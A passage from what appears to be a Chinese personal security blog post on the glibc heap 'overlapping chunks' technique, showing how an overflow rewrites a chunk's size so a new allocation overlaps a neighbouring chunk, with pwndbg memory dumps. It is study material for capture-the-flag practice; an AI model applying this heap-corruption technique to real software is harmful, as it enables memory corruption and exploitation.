class="line">CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�</span><br><span class="line">我们在p6里面写一些东西</span><br><span class="line">chunk p3内的数据:</span><br><span class="line">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�</span><br></pre></td></tr></table></figure>
+
+<p>首先分配5个chunk，p1，p2，p3，p4，p5</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240985.png" alt="image-20220108222336635"></p>
+<p>接下来释放p4，此时p2的size为0x3f0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240986.png" alt="image-20220108222635373"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240987.png" alt="image-20220108222833322"></p>
+<p>此时通过p1溢出修改p2的size为0x7e0，p2将p3包含在一起</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240988.png" alt="image-20220108222927773"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240989.png" alt="image-20220108223011129"></p>
+<p>再次去 malloc 0x7e0 大小的 chunk p6 会把包含 p3 的 p2 给申请到,这样再去编辑p6时也可以编辑到p3</p>
+<p>修改p6之前：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x6037e0</span></span><br><span class="line"><span class="number">0x6037e0</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x00000000000003f1</span>   #p3</span><br><span class="line"><span class="number">0x6037f0</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603800</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603810</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603820</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603830</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603840</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603850</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603860</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603870</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line">... ...</span><br><span class="line"><span class="number">0x6039c0</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x6039d0</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x6039e0</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x6039f0</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603a00</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603a10</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603a20</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br></pre></td></tr></table></figure>
+
+<p>若memset(p6,’F’,1500)，则：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x6037e0</span></span><br><span class="line"><span class="number">0x6037e0</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span>  #p3</span><br><span class="line"><span class="number">0x6037f0</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603800</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603810</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603820</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603830</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603840</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603850</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603860</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x603870</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line">... ...</span><br><span class="line"><span class="number">0x6039c0</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4646464646464646</span></span><br><span class="line"><span class="number">0x6039d0</span>:	<span class="number">0x4646464646464646</span>	<span class="number">0x4343434346464646</span></span><br><span class="line"><span class="number">0x6039e0</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x6039f0</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603a00</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603a10</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"><span class="number">0x603a20</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x4343434343434343</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/01/09/fastbin_attack/" title="fastbin_attack">
+                    <div class="nextTitle">fastbin_attack</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/" title="gdb的使用">
+                    <div class="prevTitle">gdb的使用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping-chunks"><span class="toc-number">1.</span> <span class="toc-text">overlapping chunks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E8%A2%AB%E9%87%8A%E6%94%BE%E5%9D%97"><span class="toc-number">1.1.</span> <span class="toc-text">拓展被释放块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E5%B7%B2%E5%88%86%E9%85%8D%E5%9D%97"><span class="toc-number">1.2.</span> <span class="toc-text">扩展已分配块</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span>
+            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span>
+            <a class="archive-post-title" href="/2022/03/15/libc-2.26/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span>
+            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span>
+            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span>
+            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span>
+            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
+                <span class="iconfont-archer">&#xe606;</span>
+                unsorted bin attack
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="house of spirit">
+                <span class="iconfont-archer">&#xe606;</span>
+                house of spirit
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fastbin doule free">
+                <span class="iconfont-archer">&#xe606;</span>
+                fastbin doule free
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Diary">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Diary
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
